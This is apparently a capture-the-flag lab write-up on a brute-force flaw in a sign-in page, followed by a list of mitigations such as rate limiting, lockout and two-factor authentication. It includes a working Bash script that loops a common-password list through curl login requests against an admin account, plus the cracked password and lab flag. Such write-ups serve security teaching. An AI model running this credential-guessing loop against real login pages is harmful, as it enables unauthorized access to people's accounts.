# Brute Force Sign-In Vulnerability

## Overview

A **Brute Force Vulnerability** was discovered on the sign-in page, allowing attackers to repeatedly attempt multiple password combinations to gain unauthorized access to an account. This issue demonstrates the absence effective rate limiting, account lockout mechanisms or even Two Factor Authentication.

## Methodology

1. **Password List Creation**

   - A list of commonly used passwords was sourced and filtered from [Wikipedia](https://en.wikipedia.org/wiki/List_of_the_most_common_passwords), containing entries such as:
     - `123456`, `password`, `12345678`, `qwerty`, `abc123`, `shadow`, and more.

2. **Script Execution**

   - A Bash script was created to iterate through the password list and send HTTP POST requests to the sign-in page.

   - Script:

     ```bash
     password=(1q2w3e4r, 1qaz2wsx, 123123, 12345, 123456, 1234567, 12345678, 123456789, 1234567890, 1234, 123qwe, abc123, admin, adobe123, access, ashley, baseball, bailey, batman, charlie, dragon, donald, flower, football, freedom, hello, hottie, iloveyou, jesus, letmein, login, lovely, master, michael, monkey, mustang, password, password1, photoshop, princess, qwerty, qwerty123, qwertyuiop, shadow, solo, sunshine, trustno1, zaq1zaq1)

     for i in ${password[@]}; do
         echo ${i}
         curl -X POST "http://192.168.122.121/index.php?page=signin&username=admin&password=${i}&Login=Login" | grep 'flag'
     done
     ```

3. **Exploitation**
   - The script was executed to test password combinations against the `admin` username.
   - The password `shadow` successfully authenticated the account, revealing the flag.

## Flag

- **Flag**: b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2

---

## How to Prevent Identification And Authentication Failures Vulnerabilities

To mitigate brute force vulnerabilities, implement the following security measures:

1. **Rate Limiting**

   - Limit the number of login attempts per user/IP address within a specified timeframe.

2. **Account Lockout Mechanisms**

   - Temporarily lock accounts after a certain number of failed login attempts.

3. **Strong Password Policies**

   - Enforce strong password creation rules, requiring a mix of uppercase, lowercase, numbers, and special characters.

4. **Two-Factor Authentication (2FA)**

   - Add an additional layer of security by requiring a second authentication factor.

5. **Captcha Integration**

   - Implement CAPTCHA to prevent automated login attempts.

6. **Monitoring and Alerts**

   - Monitor login attempts and generate alerts for suspicious activity (e.g., multiple failed attempts).

7. **Hash and Salt Passwords**
   - Store passwords securely using strong hashing algorithms and salts.

By employing these best practices, developers can reduce the risk of brute force attacks and ensure robust authentication mechanisms.
